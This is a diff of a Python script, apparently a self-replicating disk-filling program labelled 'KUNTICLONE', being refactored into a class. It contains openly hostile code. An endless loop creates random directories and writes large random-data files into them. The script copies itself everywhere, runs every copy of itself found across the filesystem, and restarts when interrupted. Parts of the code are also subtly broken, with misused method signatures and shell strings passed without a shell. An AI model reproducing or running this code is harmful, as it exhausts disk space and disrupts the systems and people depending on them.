@@ -4,51 +4,69 @@ import string
 import sys
 import random
 import os
-from termcolor import colored
-perintah = argv
-nama = str(perintah[0])
-print(nama)
-i = 1
-filename = "karma"
-panjang = 16
-yuhu = sys.argv[0]
-namaprogram = yuhu[2:]
+from termcolor import colored as cl
 
-def generatorUkuran(ukuranF, filename):
-    kb = 1_000
-    with open(filename, 'wb') as file:
-        file.write(os.urandom(ukuranF*kb))
+class zetsu:
+    def __init__(self, pr, nn, ii, ff, pj, yh, np):
+        self.pr = pr
+        self.nn = nn
+        self.ii = ii
+        self.ff = ff
+        self.pj = pj
+        self.yh = yh
+        self.np = np
+    def logo():
+        print(cl("""
+  (( ))
+  66666 __________  6
+  6 6 6 KUNTICLONE\\/
+  66666  ||    ||
+   666   **    **
+  By CukiD for UNIX\n""", "red"))
 
-def main(i):
-    while(i > 0):
-        randname = ''.join(random.choice(string.ascii_letters) for _ in range(panjang))
-        try:
-            if i == i:
-                i += 1
-                direktori = randname+str(i)
-                subprocess.call(['mkdir', direktori])
-                generatorUkuran(1024, filename)
-                subprocess.call(['cp',filename,direktori])
-                subprocess.call([f'cp {namaprogram} $pwd/{direktori}'])
-                subprocess.call([f'cp {nama} $pwd/{direktori}'])
-                subprocess.call([f'ls -h | grep / | xargs -I % cp {direktori} %/{direktori}'])
-                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
-                subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',direktori,'@'])
-                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
-            elif i <= i:
-                i += 2
-                direktori = randname+str(i)
-                subprocess.call(['mkdir', direktori])
-                generatorUkuran(1024, filename)
-                subprocess.call(['cp',filename,direktori])
-                subprocess.call([f'cp {namaprogram}',direktori])
-                subprocess.call(['cp',nama,direktori])
-                subprocess.call([f'ls -h | grep / | xargs -I % cp {direktori} %/{direktori}'])
-                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
-                subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',direktori,'@'])
-                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
-        except KeyboardInterrupt:
-            main()
+    def genuk(aa, bb):
+        kb = 100_000
+        with open(bb, 'wb') as file:
+            file.write(os.urandom(aa*kb))
+
+    def main(self):
+        while(self.ii > 0):
+            rn = ''.join(random.choice(string.ascii_letters) for _ in range(self.pj))
+            try:
+                if self.ii == self.ii:
+                    self.ii += 1
+                    dir = rn+str(self.ii)
+                    subprocess.call(['mkdir', dir])
+                    self.genuk(1024, self.ff)
+                    subprocess.call(['cp',self.ff,dir])
+                    subprocess.call([f'cp {self.yh} $pwd/{dir}'])
+                    subprocess.call([f'cp {self.nn} $pwd/{dir}'])
+                    subprocess.call([f'ls -h | grep / | xargs -I % cp {dir} %/{dir}'])
+                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
+                    subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',dir,'@'])
+                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
+                elif self.ii <= self.ii:
+                    self.ii += 2
+                    dir = rn+str(self.ii)
+                    subprocess.call(['mkdir', dir])
+                    self.genuk(1024, self.ff)
+                    subprocess.call(['cp',self.ff,dir])
+                    subprocess.call([f'cp {self.yh}',dir])
+                    subprocess.call(['cp',self.nn,dir])
+                    subprocess.call([f'ls -h | grep / | xargs -I % cp {dir} %/{dir}'])
+                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
+                    subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',dir,'@'])
+                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
+            except KeyboardInterrupt:
+                zetsu.main()
 
 if __name__ == "__main__":
-    main(i)
+    perintah = argv
+    nama = str(perintah[0])
+    i = 1
+    filename = "karma"
+    panjang = 16
+    yuhu = sys.argv[0]
+    namaprogram = yuhu[2:]
+    zetsu.logo()
+    zetsu.main(perintah, nama, i, filename, panjang, yuhu, namaprogram)
